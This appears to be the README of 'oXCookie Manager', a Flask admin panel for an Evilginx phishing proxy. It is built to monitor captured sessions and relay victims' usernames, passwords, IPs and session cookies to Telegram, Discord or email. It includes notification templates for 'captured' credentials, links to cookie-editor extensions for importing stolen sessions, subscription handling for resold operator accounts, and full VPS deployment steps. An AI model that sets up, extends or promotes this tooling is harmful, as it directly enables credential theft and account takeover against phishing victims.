# oXCookie Manager - Deployment Package

Complete Flask-based admin interface for Evilginx cookie monitoring with Telegram notifications, role-based access control, and subscription management.

## Features

- 🍪 **Cookie Session Monitoring**: Real-time monitoring of Evilginx sessions
- 🔔 **Multi-Channel Notifications**: Telegram, Discord, and Email support
- 👥 **Role-Based Access Control**: Super Admin and Normal Admin roles
- 📅 **Subscription Management**: Admin subscription tracking with expiry dates
- 🎨 **Modern UI**: Black and glassy design theme
- 📱 **Responsive Design**: Works on all screen sizes
- 🔐 **Secure Authentication**: Password hashing and session management

## Default Settings

### Default Admin Credentials
- **Username**: `admin`
- **Password**: `admin123`
- **Role**: `super_admin`

⚠️ **IMPORTANT**: Change the default password immediately after first login!

### Default Notification Templates

All notification templates use Telegram MarkdownV2 format and can be customized in the Notification Settings page.

#### Incoming Cookie Notification
```
*🍪 New Cookie Session Captured\!*

━━━━━━━━━━━━━━━━━━━━
*Session Details:*
• *ID:* `{session_id}`
• *Username:* `{username}`
• *Password:* `{password}`
• *Remote IP:* `{remote_addr}`
• *User Agent:* `{useragent}`
• *Timestamp:* `{time}`
━━━━━━━━━━━━━━━━━━━━
```

#### Status Update Notification
```
*⚙️ System Status Changed*

━━━━━━━━━━━━━━━━━━━━
*Current Status:*
• *Monitoring:* `{monitoring_status}`
• *Telegram:* `{telegram_status}`
• *Discord:* `{discord_status}`
• *Email:* `{email_status}`
*Admin Information:*
• *Admin Status:* `{admin_status}`
• *Subscription End Date:* `{subscription_end_date}`
• *Updated At:* `{time}`
━━━━━━━━━━━━━━━━━
```

#### Subscription Warning Notification
```
*⏰ Subscription Expiring Soon\!*

━━━━━━━━━━━━━━━━━━━━
*Account:* `{username}`
*Current Status:* `{status}`
*Expiry Date:* `{expiry_date}`
*Days Remaining:* `{days_remaining}`

Please contact support to renew your subscription\.
━━━━━━━━━━━━━━━━━━━━
```

#### Account Extension Notification
```
*🎉 Subscription Extended\!*

━━━━━━━━━━━━━━━━━━━━
*Account:* `{username}`
*Days Added:* `{days_added}`
*New Expiry Date:* `{expiry_date}`
*Status:* `{status}`
━━━━━━━━━━━━━━━━━━━━
```

#### Startup Notification
```
*🚀 oXCookie Manager Started\!*

System is now online and ready to monitor sessions\.
```

### Default Extension URLs

- **Cookie-Editor Chrome**: `https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm`
- **Cookie-Editor Firefox**: `https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/`
- **EditThisCookie Chrome**: `https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg`
- **EditThisCookie Firefox**: `https://addons.mozilla.org/en-US/firefox/addon/edit-this-cookie/`

## Installation

### Quick Install (Automated)

We provide automated installers for Windows:

- **PowerShell Installer** (Recommended): `installer.ps1`
- **Batch Installer**: `installer.bat`

Both installers will:
- Deploy all files to your VPS
- Install dependencies
- Configure systemd service
- Set up Nginx reverse proxy
- Optionally configure DNS
- Start the application

See `INSTALLER_README.md` for detailed instructions.

### Manual Installation

#### Prerequisites

- Python 3.8 or higher
- pip (Python package manager)

#### Step 1: Install Dependencies

```bash
pip install -r requirements.txt
```

### Step 2: Run the Application

The database path can be configured through the web interface after login. No need to edit source code.

```bash
python app.py
```

The application will start on `http://0.0.0.0:5004`

## Configuration

### First-Time Setup

1. Login with default credentials: `admin` / `admin123`
2. Go to **⚙️ Configuration** (Super Admin only)
3. **IMPORTANT**: First, configure the **Database File Path** to point to your Evilginx database file
4. Then configure:
   - Telegram settings (token, chat ID)
   - Discord settings (optional)
   - Email settings (optional)
   - Web URL (for Telegram notification buttons)
   - Support Telegram username
   - Extension URLs

### Creating Admin Users

1. Login as Super Admin
2. Go to **👥 Manage Admins**
3. Click **Create New Admin**
4. Set:
   - Username
   - Password
   - Subscription duration (days)
   - Subscription status (active/suspended/expired)

### Customizing Notifications

1. Login as Super Admin
2. Go to **🔔 Notifications**
3. Customize notification templates for:
   - Incoming Cookie Notifications
   - Status Update Notifications
   - Subscription Warning Notifications
   - Account Extension Notifications
   - Startup Notifications

## VPS Deployment

### Using systemd (Recommended)

1. Create a systemd service file `/etc/systemd/system/oxcookie-manager.service`:

```ini
[Unit]
Description=oXCookie Manager Flask Application
After=network.target

[Service]
Type=simple
User=your-user
WorkingDirectory=/path/to/deployment
Environment="PATH=/usr/bin:/usr/local/bin"
ExecStart=/usr/bin/python3 /path/to/deployment/app.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

2. Enable and start the service:

```bash
sudo systemctl daemon-reload
sudo systemctl enable oxcookie-manager
sudo systemctl start oxcookie-manager
```

3. Check status:

```bash
sudo systemctl status oxcookie-manager
```

### Using Nginx Reverse Proxy

Add to your Nginx configuration:

```nginx
server {
    listen 80;
    server_name your-domain.com;

    location / {
        proxy_pass http://127.0.0.1:5004;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

### Using Supervisor

1. Install supervisor:

```bash
sudo apt-get install supervisor
```

2. Create config file `/etc/supervisor/conf.d/oxcookie-manager.conf`:

```ini
[program:oxcookie-manager]
command=/usr/bin/python3 /path/to/deployment/app.py
directory=/path/to/deployment
user=your-user
autostart=true
autorestart=true
stderr_logfile=/var/log/oxcookie-manager.err.log
stdout_logfile=/var/log/oxcookie-manager.out.log
```

3. Start supervisor:

```bash
sudo supervisorctl reread
sudo supervisorctl update
sudo supervisorctl start oxcookie-manager
```

## File Structure

```
deployment/
├── app.py                 # Main Flask application
├── notifications.py       # Notification handlers (Telegram, Discord, Email)
├── session_processor.py   # Cookie extraction and processing
├── database_reader.py     # Database reading functions
├── requirements.txt       # Python dependencies
├── templates/            # HTML templates
│   ├── index.html        # Main dashboard
│   ├── login.html        # Login page
│   ├── manage_admins.html # Admin management
│   ├── notifications.html # Notification settings
│   └── database_viewer.html # Database viewer
├── .gitignore            # Git ignore rules
└── README.md             # This file
```

## Security Notes

1. **Change Default Password**: Immediately change the default admin password after first login
2. **Use HTTPS**: Always use HTTPS in production (use Nginx with SSL)
3. **Firewall**: Only expose port 5004 to trusted networks or use reverse proxy
4. **File Permissions**: Ensure config and auth files have proper permissions (600)
5. **Database Path**: Keep database file secure and backed up

## Troubleshooting

### Application won't start
- Check Python version: `python3 --version` (should be 3.8+)
- Check dependencies: `pip list`
- Check database path exists and is readable

### Notifications not sending
- Verify Telegram token and chat ID in configuration
- Check network connectivity
- Review application logs for error messages

### Database not found
- Verify database path in configuration
- Check file permissions
- Ensure path is absolute, not relative

## Support

For issues or questions, contact support via the configured Telegram username in the admin panel.

## License

This software is provided as-is for monitoring and management purposes.

